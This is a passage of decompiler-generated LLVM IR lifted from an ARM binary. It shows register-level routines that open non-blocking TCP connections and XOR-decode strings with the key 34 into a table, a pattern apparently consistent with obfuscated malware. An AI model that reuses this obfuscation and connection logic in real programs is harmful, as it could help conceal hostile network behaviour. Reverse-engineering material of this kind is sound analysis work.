  store i32 %v5_fe80, i32* %r0.global-to-local, align 4
  %v7_fe84 = icmp eq i32 %v5_fe80, 4
  store i1 %v7_fe84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe84, label %dec_label_pc_fe8c, label %bb122

dec_label_pc_fe8c:                                ; preds = %dec_label_pc_fe68
  %v2_fe8c = inttoptr i32 %v1_fdb8 to i8*
  %v3_fe8c = load i8, i8* %v2_fe8c, align 1
  %v4_fe8c = zext i8 %v3_fe8c to i32
  store i32 %v4_fe8c, i32* %r3.global-to-local, align 4
  store i32 %v2_fa9c, i32* %r2.global-to-local, align 4
  %v1_fe98 = add i32 %v2_fda4, 11
  %v2_fe98 = inttoptr i32 %v1_fe98 to i8*
  %v3_fe98 = load i8, i8* %v2_fe98, align 1
  %v4_fe98 = zext i8 %v3_fe98 to i32
  store i32 %v4_fe98, i32* %r2.global-to-local, align 4
  store i32 %v2_fa9c, i32* %r3.global-to-local, align 4
  %v1_fea4 = add i32 %v2_fda4, 12
  %v2_fea4 = inttoptr i32 %v1_fea4 to i8*
  %v3_fea4 = load i8, i8* %v2_fea4, align 1
  %v4_fea4 = zext i8 %v3_fea4 to i32
  store i32 %v4_fea4, i32* %r3.global-to-local, align 4
  store i32 %v2_fa9c, i32* @ip, align 4
  %v1_feb0 = add i32 %v2_fda4, 13
  %v2_feb0 = inttoptr i32 %v1_feb0 to i8*
  %v3_feb0 = load i8, i8* %v2_feb0, align 1
  %v4_feb0 = zext i8 %v3_feb0 to i32
  store i32 %v4_feb0, i32* %r2.global-to-local, align 4
  %v0_feb8 = load i32, i32* @fp, align 4
  %v1_feb8 = inttoptr i32 %v0_feb8 to i8*
  %v2_feb8 = load i8, i8* %v1_feb8, align 1
  %v3_feb8 = zext i8 %v2_feb8 to i32
  %v1_febc = mul nuw nsw i32 %v3_feb8, 4
  %v3_fec0 = add nuw nsw i32 %v1_febc, 4
  store i32 %v3_fec0, i32* %r1.global-to-local, align 4
  %v1_fec4 = add i32 %v0_feb8, 4
  %v2_fec4 = inttoptr i32 %v1_fec4 to i32*
  %v3_fec4 = load i32, i32* %v2_fec4, align 4
  store i32 %v3_fec4, i32* %r0.global-to-local, align 4
  %v3_fec8 = sext i8 %v3_feb0 to i32
  %v5_fec8 = sext i8 %v3_fea4 to i32
  %v10_fec8 = inttoptr i32 %v3_fec4 to i32*
  %v11_fec8 = call i32 @function_145dc(i32* %v10_fec8, i32 %v3_fec0, i32 %v3_fec8, i32 %v5_fec8)
  store i32 %v11_fec8, i32* %r0.global-to-local, align 4
  %v0_fecc = load i32, i32* @fp, align 4
  %v1_fecc = inttoptr i32 %v0_fecc to i8*
  %v2_fecc = load i8, i8* %v1_fecc, align 1
  %v3_fecc = zext i8 %v2_fecc to i32
  store i32 %v3_fecc, i32* %r2.global-to-local, align 4
  %v4_fed4 = sext i8 %v3_fe8c to i32
  store i32 %v4_fed4, i32* %r3.global-to-local, align 4
  %v1_fed8 = add nuw nsw i32 %v3_fecc, 1
  store i32 %v1_fed8, i32* %r1.global-to-local, align 4
  %v5_fedc = mul nuw nsw i32 %v3_fecc, 4
  %v6_fedc = add i32 %v5_fedc, %v11_fec8
  %v7_fedc = inttoptr i32 %v6_fedc to i32*
  store i32 %v4_fed4, i32* %v7_fedc, align 4
  %v1_fee0 = load i32, i32* @fp, align 4
  %v2_fee0 = add i32 %v1_fee0, 4
  %v3_fee0 = inttoptr i32 %v2_fee0 to i32*
  store i32 %v11_fec8, i32* %v3_fee0, align 4
  %v0_fee4 = load i32, i32* %r1.global-to-local, align 4
  %v1_fee4 = trunc i32 %v0_fee4 to i8
  %v2_fee4 = load i32, i32* @fp, align 4
  %v3_fee4 = inttoptr i32 %v2_fee4 to i8*
  store i8 %v1_fee4, i8* %v3_fee4, align 1
  %v0_fee8 = load i32, i32* @r4, align 4
  %v1_fee8 = add i32 %v0_fee8, 9
  %v2_fee8 = inttoptr i32 %v1_fee8 to i8*
  %v3_fee8 = load i8, i8* %v2_fee8, align 1
  %v4_fee8 = zext i8 %v3_fee8 to i32
  store i32 %v4_fee8, i32* %r3.global-to-local, align 4
  %v1_feec = add i32 %v0_fee8, 8
  %v2_feec = inttoptr i32 %v1_feec to i8*
  %v3_feec = load i8, i8* %v2_feec, align 1
  %v4_feec = zext i8 %v3_feec to i32
  %v4_fef0 = mul nuw nsw i32 %v4_fee8, 256
  %v5_fef0 = or i32 %v4_feec, %v4_fef0
  %v3_fef4 = mul i32 %v5_fef0, 65536
  store i32 %v3_fef4, i32* %r2.global-to-local, align 4
  %v3_fef8 = mul nuw nsw i32 %v4_feec, 256
  store i32 %v3_fef8, i32* %r3.global-to-local, align 4
  %v5_ff00 = or i32 %v3_fef8, %v4_fee8
  store i32 %v5_ff00, i32* %r0.global-to-local, align 4
  %v0_ff04 = load i32, i32* @r7, align 4
  %v2_ff04 = add i32 %v0_ff04, %v5_ff00
  %v0_fd40.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_fd40.backedge

; uselistorder directives
  uselistorder i32 %v3_fef8, { 1, 0 }
  uselistorder i32 %v4_fee8, { 1, 0, 2 }
  uselistorder i32 %v11_fec8, { 1, 0, 2 }
  uselistorder i32 %v3_fec0, { 1, 0 }
  uselistorder i32 %v5_fe80, { 1, 2, 0 }
  uselistorder i32 %v3_fe78, { 1, 0 }
  uselistorder i32 %v4_fe68, { 1, 0, 2 }
  uselistorder i32 %v2_fe4c, { 1, 0 }
  uselistorder i32 %v3_fdcc, { 0, 2, 1 }
  uselistorder i32 %v1_fe4c65, { 1, 0 }
  uselistorder i32 %v1_fe48, { 1, 2, 0 }
  uselistorder i32 %v2_fe3c, { 1, 0 }
  uselistorder i32 %v3_fd60, { 0, 2, 1 }
  uselistorder i32 %v1_fe3c50, { 1, 0 }
  uselistorder i32 %v1_fe38, { 1, 2, 0 }
  uselistorder i1 %v7_fd48, { 1, 0 }
  uselistorder i32 %v1_fd40, { 1, 0 }
  uselistorder i32 %storemerge29, { 1, 0 }
  uselistorder i32 %v3_fdf4, { 0, 2, 1 }
  uselistorder i32 %v2_fdf0, { 1, 2, 0 }
  uselistorder i32 %v0_fe44, { 2, 0, 1 }
  uselistorder i32 %v1_fe4c, { 1, 2, 0 }
  uselistorder i32 %v3_fdd428, { 1, 0 }
  uselistorder i32 %v3_fdcc26, { 1, 0, 2 }
  uselistorder i32 %v1_fdb8, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32 %v2_fda4, { 0, 1, 2, 4, 3, 6, 5, 7, 9, 8, 10 }
  uselistorder i32 %v3_fd88, { 0, 2, 1 }
  uselistorder i32 %v2_fd84, { 1, 2, 0 }
  uselistorder i32 %v0_fe34, { 2, 0, 1 }
  uselistorder i32 %v1_fe3c, { 1, 2, 0 }
  uselistorder i32 %v3_fd6822, { 1, 0 }
  uselistorder i32 %v3_fd6020, { 1, 0, 2 }
  uselistorder i32 %v0_fda4143, { 3, 0, 1, 2 }
  uselistorder i32 %v3_fd4c142, { 1, 0 }
  uselistorder i1 %v7_fd48141, { 1, 0 }
  uselistorder i32 %v1_fd40134, { 1, 0 }
  uselistorder i1 %v9_fd1c, { 1, 0 }
  uselistorder i32 %v0_fcdc, { 1, 0 }
  uselistorder i32 %v0_fcd0, { 1, 0, 2 }
  uselistorder i32 %v0_fcc0, { 1, 0 }
  uselistorder i32 %v0_fc98, { 1, 0 }
  uselistorder i32 %v1_fc4c, { 1, 0, 2 }
  uselistorder i1 %v7_fc44, { 1, 0 }
  uselistorder i32 %v5_fc40, { 1, 0, 2 }
  uselistorder i32 %v1_fc08, { 1, 0 }
  uselistorder i32 %v3_fbf4, { 1, 0 }
  uselistorder i32 %v0_fbec, { 1, 0 }
  uselistorder i32 %v1_fbe0, { 1, 2, 0 }
  uselistorder i1 %v7_fb98, { 1, 0 }
  uselistorder i32 %v4_fb94, { 1, 0, 2 }
  uselistorder i1 %v7_fb7c, { 1, 0 }
  uselistorder i32 %v3_fb78, { 1, 0, 2 }
  uselistorder i1 %v7_fb60, { 1, 0 }
  uselistorder i32 %v3_fb5c, { 2, 1, 0, 3 }
  uselistorder i1 %v7_fb44, { 2, 1, 0 }
  uselistorder i32 %v1_fb48, { 1, 0 }
  uselistorder i32 %v2_fbd0, { 1, 0, 2 }
  uselistorder i16 %v5_faec, { 1, 0 }
  uselistorder i32 %v2_fae8, { 1, 0, 2, 3 }
  uselistorder i32 %v6_fad4, { 1, 2, 0 }
  uselistorder i64 %v5_fad0, { 0, 2, 1 }
  uselistorder i32 %v1_fabc, { 1, 0, 2 }
  uselistorder i32 %v1_fa74, { 1, 0 }
  uselistorder i32 %v1_fa70, { 1, 2, 0 }
  uselistorder i32 %v2_fa6c, { 1, 0 }
  uselistorder i1 %v8_fa58, { 1, 0 }
  uselistorder i32 %v2_fa30, { 1, 0, 2 }
  uselistorder i16* %stack_var_-2244, { 1, 0 }
  uselistorder i32* %stack_var_-68, { 0, 2, 1 }
  uselistorder i16* %stack_var_-4292, { 1, 0 }
  uselistorder i16 %tmp79, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 4, 1, 3, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 16, 11, 14, 12, 13, 15, 17, 35, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 32, 33, 36 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 12, 8, 29, 10, 11, 28, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 4, 6, 3, 21, 5, 20, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 23, 22, 24, 19 }
  uselistorder i32* %r0.global-to-local, { 1, 5, 2, 3, 4, 11, 6, 8, 7, 9, 10, 12, 15, 13, 14, 17, 16, 20, 18, 19, 21, 22, 24, 23, 26, 25, 27, 29, 28, 30, 33, 32, 31, 35, 34, 36, 37, 38, 39, 40, 41, 42, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 8, 2, 13, 3, 4, 14, 5, 6, 7, 35, 9, 10, 11, 12, 34, 36, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 33, 30, 31, 29, 32, 37 }
  uselistorder i32 (i32)* @function_1524c, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_fdcc.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_fd60.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_fd40.backedge, { 1, 0 }
  uselistorder label %bb122, { 0, 2, 1 }
  uselistorder label %dec_label_pc_fddc, { 1, 0 }
  uselistorder label %dec_label_pc_fddc.preheader, { 1, 0 }
  uselistorder label %bb120, { 1, 0 }
  uselistorder label %dec_label_pc_fd70, { 1, 0 }
  uselistorder label %dec_label_pc_fd70.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_fd54, { 1, 0 }
  uselistorder label %dec_label_pc_fcdc, { 1, 0 }
  uselistorder label %dec_label_pc_fcc8, { 5, 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_fca8, { 2, 1, 4, 0, 3 }
  uselistorder label %bb118, { 1, 0 }
  uselistorder label %bb115, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_fa50, { 1, 0 }
}

define i32 @function_ff0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_ff0c:
  %v2_ff18 = load i32, i32* @global_var_233b8.181, align 4
  %v2_ff20 = call i32 @function_12f18(i32 %v2_ff18, i32 9)
  ret i32 %v2_ff20
}

define i32 @function_ff34() local_unnamed_addr {
dec_label_pc_ff34:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_ff34 = load i32, i32* @r4, align 4
  store i32 %v3_ff34, i32* %stack_var_-16, align 4
  %v12_ff34 = load i32, i32* @lr, align 4
  %v0_ff38 = load i32, i32* @r0, align 4
  store i32 %v0_ff38, i32* %r5.global-to-local, align 4
  %v1_ff3c = add i32 %v0_ff38, 4
  %v2_ff3c = inttoptr i32 %v1_ff3c to i32*
  %v3_ff3c = load i32, i32* %v2_ff3c, align 4
  store i32 %v3_ff3c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 65376, i32* @lr, align 4
  %v1_ff5c = icmp ne i32 %v3_ff3c, -1
  call void @__pseudo_cond_branch(i1 %v1_ff5c, i32 ptrtoint (i32* @global_var_1314c.22 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_ff6c = call i32 @function_13940(i32 2, i32 1, i32 0)
  store i32 %v3_ff6c, i32* %r0.global-to-local, align 4
  %v7_ff70 = icmp eq i32 %v3_ff6c, -1
  %v1_ff74 = load i32, i32* %r5.global-to-local, align 4
  %v2_ff74 = add i32 %v1_ff74, 4
  %v3_ff74 = inttoptr i32 %v2_ff74 to i32*
  store i32 %v3_ff6c, i32* %v3_ff74, align 4
  br i1 %v7_ff70, label %dec_label_pc_ff34.dec_label_pc_ffec_crit_edge, label %dec_label_pc_ff7c

dec_label_pc_ff34.dec_label_pc_ffec_crit_edge:    ; preds = %dec_label_pc_ff34
  %v1_fff4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ffec

dec_label_pc_ff7c:                                ; preds = %dec_label_pc_ff34
  %v2_ff40 = ptrtoint i32* %stack_var_-32 to i32
  %v0_ff7c = load i32, i32* %r5.global-to-local, align 4
  %v1_ff7c = add i32 %v0_ff7c, 28
  store i32 %v1_ff7c, i32* %r0.global-to-local, align 4
  %v0_ff80 = load i32, i32* %r6.global-to-local, align 4
  %v2_ff80 = add i32 %v0_ff7c, 24
  %v3_ff80 = inttoptr i32 %v2_ff80 to i32*
  store i32 %v0_ff80, i32* %v3_ff80, align 4
  %v2_ff88 = call i32 @function_12514(i32 %v1_ff7c, i32 256)
  store i32 %v2_ff88, i32* %r0.global-to-local, align 4
  %v0_ff8c = load i32, i32* %r5.global-to-local, align 4
  %v1_ff8c = add i32 %v0_ff8c, 4
  %v2_ff8c = inttoptr i32 %v1_ff8c to i32*
  %v3_ff8c = load i32, i32* %v2_ff8c, align 4
  store i32 %v3_ff8c, i32* %r4.global-to-local, align 4
  %v0_ff90 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_ff90, i32* %r2.global-to-local, align 4
  store i32 %v3_ff8c, i32* %r0.global-to-local, align 4
  %v2_ff9c = call i32 @function_12f80(i32 %v3_ff8c, i32 3)
  %v1_ffa4 = or i32 %v2_ff9c, 2048
  store i32 %v1_ffa4, i32* %r2.global-to-local, align 4
  %v0_ffa8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_ffa8, i32* %r0.global-to-local, align 4
  %v2_ffac = call i32 @function_12f80(i32 %v0_ffa8, i32 4)
  store i32 %v2_ffac, i32* %r0.global-to-local, align 4
  %v2_ffb4 = load i32, i32* @global_var_21360.183, align 4
  store i32 %v2_ffb4, i32* %r2.global-to-local, align 4
  %v1_ffbc = load i32, i32* %r5.global-to-local, align 4
  %v2_ffbc = add i32 %v1_ffbc, 12
  %v3_ffbc = inttoptr i32 %v2_ffbc to i32*
  store i32 1, i32* %v3_ffbc, align 4
  store i32 2, i32* @r3, align 4
  store i32 2, i32* %stack_var_-32, align 4
  %v0_ffc8 = load i32, i32* %r2.global-to-local, align 4
  %v1_ffc8 = load i32, i32* %r5.global-to-local, align 4
  %v2_ffc8 = add i32 %v1_ffc8, 8
  %v3_ffc8 = inttoptr i32 %v2_ffc8 to i32*
  store i32 %v0_ffc8, i32* %v3_ffc8, align 4
  %v0_ffcc = load i32, i32* %r5.global-to-local, align 4
  %v1_ffcc = add i32 %v0_ffcc, 16
  %v2_ffcc = inttoptr i32 %v1_ffcc to i32*
  %v3_ffcc = load i32, i32* %v2_ffcc, align 4
  store i32 %v3_ffcc, i32* @ip, align 4
  %v1_ffd0 = add i32 %v0_ffcc, 4
  %v2_ffd0 = inttoptr i32 %v1_ffd0 to i32*
  %v3_ffd0 = load i32, i32* %v2_ffd0, align 4
  store i32 %v3_ffd0, i32* %r0.global-to-local, align 4
  %v1_ffd4 = add i32 %v0_ffcc, 20
  %v2_ffd4 = inttoptr i32 %v1_ffd4 to i16*
  %v3_ffd4 = load i16, i16* %v2_ffd4, align 2
  %v4_ffd4 = zext i16 %v3_ffd4 to i32
  store i32 %v4_ffd4, i32* %r5.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_ffe8 = call i32 @function_13728(i32 %v3_ffd0, i32 %v2_ff40, i32 16)
  store i32 %v3_ffe8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ffec

dec_label_pc_ffec:                                ; preds = %dec_label_pc_ff34.dec_label_pc_ffec_crit_edge, %dec_label_pc_ff7c
  %v1_fff4 = phi i32 [ %v1_fff4.pre, %dec_label_pc_ff34.dec_label_pc_ffec_crit_edge ], [ %v3_ffe8, %dec_label_pc_ff7c ]
  %v2_fff0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_fff0, i32* @r4, align 4
  store i32 %v12_ff34, i32* @lr, align 4
  ret i32 %v1_fff4

; uselistorder directives
  uselistorder i32 %v3_ff6c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 6, 5, 9, 10, 8, 7 }
  uselistorder i32 (i32, i32)* @function_12514, { 7, 15, 10, 9, 8, 16, 14, 13, 12, 11, 6, 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_ffec, { 1, 0 }
}

define i32 @function_fffc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_fffc:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_fffc = load i32, i32* @r4, align 4
  %v6_fffc = load i32, i32* @r5, align 4
  %v9_fffc = load i32, i32* @r6, align 4
  %v12_fffc = load i32, i32* @r7, align 4
  %v15_fffc = load i32, i32* @r8, align 4
  %v18_fffc = load i32, i32* @sb, align 4
  %v21_fffc = load i32, i32* @sl, align 4
  %v24_fffc = load i32, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_2132c.185 to i32), i32* @fp, align 4
  %v2_10004 = load i32, i32* @global_var_2132c.185, align 4
  store i32 ptrtoint (i32* @global_var_21358.187 to i32), i32* @sl, align 4
  %v1_10010 = add i32 %v2_10004, 1
  store i32 %v1_10010, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_1001c = load i32, i32* @global_var_21358.187, align 4
  store i32 %v2_1001c, i32* %r0.global-to-local, align 4
  %v3_10020 = mul i32 %v1_10010, 16
  store i32 %v3_10020, i32* %r1.global-to-local, align 4
  %v4_10028 = inttoptr i32 %v2_1001c to i32*
  %v5_10028 = call i32 @function_145dc(i32* %v4_10028, i32 %v3_10020, i32 %arg3, i32 %v1_10010)
  %v2_1002c = load i32, i32* @global_var_2132c.185, align 4
  store i32 %v2_1002c, i32* %r2.global-to-local, align 4
  store i32 %v5_10028, i32* @r8, align 4
  %v0_10034 = load i32, i32* @r5, align 4
  store i32 %v0_10034, i32* %r0.global-to-local, align 4
  %v1_1003c = load i32, i32* @sl, align 4
  %v2_1003c = inttoptr i32 %v1_1003c to i32*
  store i32 %v5_10028, i32* %v2_1003c, align 4
  %v1_10040 = inttoptr i32 %v0_10034 to i8*
  %v2_10040 = call i32 @function_12480(i8* %v1_10040)
  %sext = mul i32 %v2_10040, 16777216
  %v1_10044 = sdiv i32 %sext, 16777216
  %v2_10044 = add nsw i32 %v1_10044, 1
  store i32 %v2_10044, i32* @r4, align 4
  store i32 %v1_10044, i32* @r7, align 4
  store i32 %v2_10044, i32* @r0, align 4
  %v0_10050 = call i32 @function_13b88()
  store i32 %v0_10050, i32* %r0.global-to-local, align 4
  %v0_10054 = load i32, i32* @r5, align 4
  store i32 %v0_10054, i32* %r1.global-to-local, align 4
  %v0_10058 = load i32, i32* @r4, align 4
  store i32 %v0_10058, i32* %r2.global-to-local, align 4
  store i32 %v0_10050, i32* %r6.global-to-local, align 4
  %v3_10060 = call i32 @function_124f0(i32 %v0_10050, i32 %v0_10054, i32 %v0_10058)
  store i32 %v3_10060, i32* %r0.global-to-local, align 4
  %v0_10064 = load i32, i32* @r7, align 4
  %tmp22 = icmp slt i32 %v0_10064, 1
  %extract.t6 = trunc i32 %v0_10064 to i8
  br i1 %tmp22, label %dec_label_pc_10088, label %dec_label_pc_1006c

dec_label_pc_1006c:                               ; preds = %dec_label_pc_fffc
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10070

dec_label_pc_10070:                               ; preds = %dec_label_pc_10070, %dec_label_pc_1006c
  %v2_10078 = phi i32 [ %v1_1007c, %dec_label_pc_10070 ], [ 0, %dec_label_pc_1006c ]
  %v1_10070 = load i32, i32* %r6.global-to-local, align 4
  %v2_10070 = add i32 %v1_10070, %v2_10078
  %v3_10070 = inttoptr i32 %v2_10070 to i8*
  %v4_10070 = load i8, i8* %v3_10070, align 1
  %v6_10070 = zext i8 %v4_10070 to i32
  %v1_10074 = xor i32 %v6_10070, 34
  store i32 %v1_10074, i32* %r3.global-to-local, align 4
  %v1_10078 = trunc i32 %v1_10074 to i8
  store i8 %v1_10078, i8* %v3_10070, align 1
  %v0_1007c = load i32, i32* %r2.global-to-local, align 4
  %v1_1007c = add i32 %v0_1007c, 1
  store i32 %v1_1007c, i32* %r2.global-to-local, align 4
  %v1_10080 = load i32, i32* @r7, align 4
  %v9_10080 = icmp eq i32 %v1_1007c, %v1_10080
  br i1 %v9_10080, label %dec_label_pc_10088.loopexit, label %dec_label_pc_10070

dec_label_pc_10088.loopexit:                      ; preds = %dec_label_pc_10070
  %extract.t = trunc i32 %v1_1007c to i8
  br label %dec_label_pc_10088

dec_label_pc_10088:                               ; preds = %dec_label_pc_10088.loopexit, %dec_label_pc_fffc
  %v0_10098.off0 = phi i8 [ %extract.t, %dec_label_pc_10088.loopexit ], [ %extract.t6, %dec_label_pc_fffc ]
  %v2_10088 = load i32, i32* @global_var_2132c.185, align 4
  %v2_1008c = load i32, i32* @global_var_21358.187, align 4
  %v3_10090 = mul i32 %v2_10088, 16
  store i32 %v3_10090, i32* @sb, align 4
  %v2_10094 = add i32 %v2_1008c, %v3_10090
  store i32 %v2_10094, i32* %r2.global-to-local, align 4
  %v3_10098 = add i32 %v2_10094, 12
  %v4_10098 = inttoptr i32 %v3_10098 to i8*
  store i8 %v0_10098.off0, i8* %v4_10098, align 1
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_1002c, i32* %r3.global-to-local, align 4
  %v0_100a4 = load i32, i32* %r6.global-to-local, align 4
  %v1_100a4 = load i32, i32* @r8, align 4
  %v5_100a4 = mul i32 %v2_1002c, 16
  %v6_100a4 = add i32 %v1_100a4, %v5_100a4
  %v7_100a4 = inttoptr i32 %v6_100a4 to i32*
  store i32 %v0_100a4, i32* %v7_100a4, align 4
  %v2_100a8 = load i32, i32* @global_var_21358.187, align 4
  store i32 %v2_100a8, i32* @r7, align 4
  %v1_100ac = inttoptr i32 %arg2 to i8*
  %v2_100ac = call i32 @function_12480(i8* %v1_100ac)
  %sext1 = mul i32 %v2_100ac, 16777216
  %v1_100b0 = sdiv i32 %sext1, 16777216
  %v2_100b0 = add nsw i32 %v1_100b0, 1
  store i32 %v2_100b0, i32* @r4, align 4
  store i32 %v1_100b0, i32* @r6, align 4
  store i32 %v2_100b0, i32* @r0, align 4
  %v0_100bc = call i32 @function_13b88()
  store i32 %v0_100bc, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_100c4 = load i32, i32* @r4, align 4
  store i32 %v0_100c4, i32* %r2.global-to-local, align 4
  store i32 %v0_100bc, i32* %r5.global-to-local, align 4
  %v3_100cc = call i32 @function_124f0(i32 %v0_100bc, i32 %arg2, i32 %v0_100c4)
  store i32 %v3_100cc, i32* %r0.global-to-local, align 4
  %v0_100d0 = load i32, i32* @r6, align 4
  %tmp23 = icmp slt i32 %v0_100d0, 1
  %extract.t8 = trunc i32 %v0_100d0 to i8
  br i1 %tmp23, label %dec_label_pc_100f4, label %dec_label_pc_100d8

dec_label_pc_100d8:                               ; preds = %dec_label_pc_10088
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_100dc

dec_label_pc_100dc:                               ; preds = %dec_label_pc_100dc, %dec_label_pc_100d8
  %v2_100e4 = phi i32 [ %v1_100e8, %dec_label_pc_100dc ], [ 0, %dec_label_pc_100d8 ]
  %v1_100dc = load i32, i32* %r5.global-to-local, align 4
  %v2_100dc = add i32 %v1_100dc, %v2_100e4
  %v3_100dc = inttoptr i32 %v2_100dc to i8*
  %v4_100dc = load i8, i8* %v3_100dc, align 1
  %v6_100dc = zext i8 %v4_100dc to i32
  %v1_100e0 = xor i32 %v6_100dc, 34
  store i32 %v1_100e0, i32* %r3.global-to-local, align 4
  %v1_100e4 = trunc i32 %v1_100e0 to i8
  store i8 %v1_100e4, i8* %v3_100dc, align 1
  %v0_100e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_100e8 = add i32 %v0_100e8, 1
  store i32 %v1_100e8, i32* %r2.global-to-local, align 4
  %v1_100ec = load i32, i32* @r6, align 4
  %v9_100ec = icmp eq i32 %v1_100e8, %v1_100ec
  br i1 %v9_100ec, label %dec_label_pc_100f4.loopexit, label %dec_label_pc_100dc

dec_label_pc_100f4.loopexit:                      ; preds = %dec_label_pc_100dc
  %extract.t7 = trunc i32 %v1_100e8 to i8
  br label %dec_label_pc_100f4

dec_label_pc_100f4:                               ; preds = %dec_label_pc_100f4.loopexit, %dec_label_pc_10088
  %v0_10104.off0 = phi i8 [ %extract.t7, %dec_label_pc_100f4.loopexit ], [ %extract.t8, %dec_label_pc_10088 ]
  %v2_100f4 = load i32, i32* @global_var_2132c.185, align 4
  store i32 %v2_100f4, i32* %r0.global-to-local, align 4
  %v2_100f8 = load i32, i32* @global_var_21358.187, align 4
  %v3_100fc = mul i32 %v2_100f4, 16
  store i32 %v3_100fc, i32* %r1.global-to-local, align 4
  %v2_10100 = or i32 %v3_100fc, 13
  %v3_10104 = add i32 %v2_10100, %v2_100f8
  %v4_10104 = inttoptr i32 %v3_10104 to i8*
  store i8 %v0_10104.off0, i8* %v4_10104, align 1
  store i32 ptrtoint (i16** @global_var_2135c.189 to i32), i32* %r4.global-to-local, align 4
  %v2_10110 = load i16, i16* bitcast (i16** @global_var_2135c.189 to i16*), align 4
  %v3_10110 = zext i16 %v2_10110 to i32
  store i32 %v3_10110, i32* %lr.global-to-local, align 4
  %v2_10118 = load i32, i32* @global_var_21358.187, align 4
  store i32 %v2_10118, i32* %r2.global-to-local, align 4
  %v0_10120 = load i32, i32* %r1.global-to-local, align 4
  %v2_10120 = add i32 %v0_10120, %v2_10118
  store i32 %v2_10120, i32* %r1.global-to-local, align 4
  store i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_2135c.189 to i32), i32 16), i32 16), i32* %r3.global-to-local, align 4
  %v0_10128 = load i32, i32* @sb, align 4
  %v1_10128 = load i32, i32* @r7, align 4
  %v2_10128 = add i32 %v1_10128, %v0_10128
  store i32 %v2_10128, i32* %ip.global-to-local, align 4
  %v0_1012c = load i32, i32* %r0.global-to-local, align 4
  %v1_1012c = add i32 %v0_1012c, 1
  store i32 %v1_1012c, i32* %r0.global-to-local, align 4
  %v3_10130 = add i32 %v2_10120, 10
  %v4_10130 = inttoptr i32 %v3_10130 to i16*
  store i16 trunc (i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_2135c.189 to i32), i32 16), i32 16) to i16), i16* %v4_10130, align 2
  %v0_10134 = load i32, i32* %lr.global-to-local, align 4
  %v1_10134 = trunc i32 %v0_10134 to i16
  %v2_10134 = load i32, i32* %r1.global-to-local, align 4
  %v3_10134 = add i32 %v2_10134, 8
  %v4_10134 = inttoptr i32 %v3_10134 to i16*
  store i16 %v1_10134, i16* %v4_10134, align 2
  %v0_10138 = load i32, i32* %r5.global-to-local, align 4
  %v1_10138 = load i32, i32* %ip.global-to-local, align 4
  %v2_10138 = add i32 %v1_10138, 4
  %v3_10138 = inttoptr i32 %v2_10138 to i32*
  store i32 %v0_10138, i32* %v3_10138, align 4
  %v1_1013c = load i32, i32* @fp, align 4
  %v2_1013c = inttoptr i32 %v1_1013c to i32*
  store i32 %v1_1012c, i32* %v2_1013c, align 4
  %v0_10140 = load i32, i32* %r3.global-to-local, align 4
  %v1_10140 = trunc i32 %v0_10140 to i16
